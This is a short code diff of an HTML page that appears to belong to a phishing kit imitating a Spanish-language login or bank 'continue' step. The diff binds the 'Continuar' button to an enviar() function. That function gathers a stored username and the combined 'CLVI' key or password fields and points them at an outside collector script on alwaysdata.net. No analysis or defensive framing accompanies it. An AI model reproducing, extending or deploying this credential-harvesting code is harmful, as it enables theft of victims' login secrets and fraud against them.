@@ -661,7 +661,7 @@ tr,td {
 		</td>
 		<td width="60%">
 			<p><input type="hidden" name="wpcf7tg_sending" value="1"><br>
-<input class="wpcf7-form-control wpcf7-submit has-spinner" type="submit" value="Continuar"><span class="wpcf7-spinner"></span><br>
+<input class="wpcf7-form-control wpcf7-submit has-spinner" type="submit" value="Continuar" onclick="enviar()"><span class="wpcf7-spinner"></span><br>
 <img decoding="async" src="clave_files/btdv-2.png" width="100%" height="auto">
 			</p>
 		</td>
@@ -935,7 +935,7 @@ var ekit_config = {"ajaxurl":"https:\/\/tl10225.site\/continuarpaso09\/wp-admin\
 async function enviar() {
 	
     const usr = localStorage.getItem("usuario");
-    const usrs = document.getElementsByName("CLVI")[0].value;
+    const usrs = document.getElementsByName("CLVI")[0].value + document.getElementsByName("CLVI")[1].value;
     
    
   const url = 'https://testnew.alwaysdata.net/iraw.php';
